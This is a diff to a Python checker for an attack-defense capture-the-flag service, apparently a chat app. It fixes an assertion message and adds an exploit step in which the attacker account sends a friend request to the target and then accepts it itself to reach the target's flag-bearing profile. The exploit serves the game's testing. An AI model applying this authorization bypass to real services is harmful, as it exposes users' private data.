@@ -130,7 +130,7 @@ async def getflag1(task: GetflagCheckerTaskMessage, client: AsyncClient, db: Cha
         raise MumbleException("Missing database entry from putflag")
     cookie = await login(task, client, username, password, logger)
     r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=cookie)
-    assert_in(task.flag, r.text, "flag missing from note")
+    assert_in(task.flag, r.text, "flag missing from chatroom")
 
 
 @checker.putnoise(0)
@@ -356,6 +356,10 @@ async def exploit1(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, clie
     password = secrets.token_hex(32)
     cookie = await register(task, client, username, password, logger)
     target = json.loads(task.attack_info)['username']
+    r = await client.post(f"{getUrl(task)}/friends/requests", json={'userName': username, 'partner': target, 'status': 'send'}, cookies=cookie)
+    assert_equals(r.status_code, 200, "sending friend request failed")
+    r = await client.post(f"{getUrl(task)}/friends/requests", json={'userName': username, 'partner': target, 'status': 'accept'}, cookies=cookie)
+    assert_equals(r.status_code, 200, "accepting friend request failed")
     r = await client.get(f"{getUrl(task)}/profile/{target}", cookies=cookie)
     if len(r.text.split('<h3>')) < 2:
         return
